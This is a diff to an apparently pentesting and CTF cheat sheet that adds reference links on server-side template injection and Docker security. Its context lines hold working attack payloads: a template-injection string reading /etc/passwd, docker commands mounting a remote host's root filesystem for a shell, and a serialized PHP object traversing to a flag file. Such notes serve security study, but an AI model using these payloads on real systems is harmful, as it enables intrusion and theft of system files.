@@ -365,6 +365,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injectio
 ### Server Sided Template Injection
 https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68  
 https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf  
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection  
 
 ```
 {% import os %}{{ os.popen("cat /etc/passwd").read() }}
@@ -563,6 +564,9 @@ docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt sh
 docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt /bin/bash
 ```
 
+### Docker Cheatsheet
+https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md
+
 ### Unicode Cheatsheet thanks to @dee-see for suggesting the link
 https://gosecure.github.io/unicode-pentester-cheatsheet/
 
@@ -646,3 +650,4 @@ if(isset($perm) && $perm->is_admin()){
 `O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`
 
 `TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`
+
